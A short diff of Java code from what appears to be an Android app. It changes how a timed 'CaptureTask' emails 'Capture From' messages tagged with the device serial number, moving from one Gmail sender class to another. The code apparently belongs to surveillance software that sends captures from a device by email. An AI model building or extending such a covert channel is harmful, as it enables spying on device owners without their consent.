@@ -6,7 +6,7 @@ import java.util.Date;
 import java.util.TimerTask;
 
 import com.system.utils.*;
-import com.system.utils.mail.GMailSender;
+import com.system.utils.mail.GMailSenderEx;
 
 import android.app.Activity;
 import android.app.Service;
@@ -81,12 +81,12 @@ class CaptureTask extends TimerTask
         
         // Send mail 
         try {   
-            GMailSender sender = new GMailSender();
+            GMailSenderEx sender = new GMailSenderEx();
             String subject = "Capture From " + DeviceProperty.getSerialNum() + " - " + now;
             String body    = subject;
-            sender.sendMail(subject, body,   
-                    "user@gmail.com",   
-                    "user@yahoo.com");   
+            sender.setSubject(subject);
+            sender.setBody(body);
+            sender.send();   
         } catch (Exception e) {   
             Log.e("SendMail", e.getMessage(), e);   
         } 
